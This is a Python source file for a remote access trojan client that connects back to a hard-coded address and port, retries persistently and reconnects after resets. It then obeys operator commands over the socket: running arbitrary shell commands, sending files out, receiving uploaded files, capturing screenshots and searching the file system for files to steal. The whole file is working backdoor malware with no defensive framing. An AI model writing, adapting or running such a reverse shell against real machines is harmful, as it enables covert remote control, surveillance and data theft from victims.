import os
import random
import socket
import subprocess
from threading import Thread
from helper_methods import *


class Client(Thread):
    def __init__(self, IP: str, Port: int):
        self.conn = socket.socket()
        self.IP = IP
        self.Port = Port
        while True:
            try:
                self.conn.connect((IP, Port))
                break
            except Exception:
                sleep_for = random.randrange(1, 10)
                time.sleep(sleep_for)
                continue
        self.conn.send(os.getcwd().encode('ISO-8859-1'))

    def transfer(self, path):
        if os.path.exists(path):
            f = open(path, 'rb')
            packet = f.read(1024)
            while len(packet) > 0:
                self.conn.send(packet)
                packet = f.read(1024)
            self.conn.send('DONE'.encode('ISO-8859-1'))
        else:
            self.conn.send('File not found'.encode('ISO-8859-1'))

    def download(self, command):
        f = open(command, 'wb')
        while True:
            bits = self.conn.recv(1024)
            if bits.endswith('DONE'.encode('ISO-8859-1')):
                f.write(bits[:-4])
                f.close()
                print('[+] Transfer completed ')
                break
            if 'File not found'.encode('ISO-8859-1') in bits:
                print('[-] Unable to find out the file')
                break
            f.write(bits)

    def run(self):
        while True:
            try:
                command = self.conn.recv(1024)
            except ConnectionResetError:
                self.__init__(self.IP, self.Port)
                continue
            if 'terminate' in command.decode('ISO-8859-1'):
                self.conn.close()
                break
            elif 'cd' in command.decode('ISO-8859-1'):
                command, path = command.decode('ISO-8859-1')[0], list_to_path(
                    command.decode('ISO-8859-1').split(' ')[1:])
                try:
                    os.chdir(path)
                    self.conn.send(f'[+] CWD is {os.getcwd()}'.encode('ISO-8859-1'))
                except Exception as e:
                    self.conn.send(('[-]' + str(e)).encode('ISO-8859-1'))
                    print("Could not enter this path.")
            elif 'grab' in command.decode('ISO-8859-1') or 'download' in command.decode('ISO-8859-1'):
                grab, path = command.decode().split("*")
                try:
                    self.transfer(path)
                except Exception:
                    pass

            elif 'upload' in command.decode('ISO-8859-1') or 'send' in command.decode('ISO-8859-1'):
                send, path = command.decode('ISO-8859-1').split("*")
                self.download(path)
            elif 'screenshot' in command.decode('ISO-8859-1'):
                path = screenshot()
                try:
                    self.transfer(path)
                except Exception as e:
                    print(e)
                    raise
            elif 'searchd' in command.decode('ISO-8859-1'):
                path = command.decode()[8:]
                lists = ''
                for dir_path, dir_name, file_names in os.walk(path):
                    for name in dir_name:
                        lists += '\n' + os.path.abspath(name)
                print(lists)
                if lists == '':
                    lists = 'No directories were found in the given path.'
                self.conn.send(lists.encode('ISO-8859-1'))
            elif 'searchf' in command.decode('ISO-8859-1'):
                command = command.decode()[8:]
                path, file_name = command.split('*')  # searchf c:/*abc.pdf -> ['c:/', 'abc.pdf']
                lists = ''
                for dir_path, dir_name, file_names in os.walk(path):
                    for file in file_names:
                        if file == file_name:
                            lists = '\n' + os.path.abspath(file)
                print(lists)
                if lists == '':
                    lists = 'No match was found in the given path.'
                self.conn.send(lists.encode('ISO-8859-1'))
            elif 'search' in command.decode('ISO-8859-1'):
                command = command.decode()[7:]
                path, ext = command.split('*')  # search c:/ *.pdf -> ['c:/', '.pdf']
                lists = ''
                for dir_path, dir_name, file_names in os.walk(path):
                    for file in file_names:
                        if file.endswith(ext):
                            lists += '\n' + os.path.join(dir_path, file)
                print(lists)
                if lists == '':
                    lists = 'No match was found in the given path.'
                self.conn.send(lists.encode('ISO-8859-1'))
            else:
                try:
                    output = subprocess.check_output(command.decode('ISO-8859-1'), timeout=3, shell=True)
                    self.conn.send(output)
                except Exception as e:
                    print(e)
                    CMD = subprocess.Popen(command.decode('ISO-8859-1'), shell=True, stdout=subprocess.PIPE,
                                           stderr=subprocess.PIPE,
                                           )
                    self.conn.send(CMD.stdout.read())
                    self.conn.send(CMD.stderr.read())


def main():
    client = Client("10.0.0.19", 8080)
    client.run()


main()
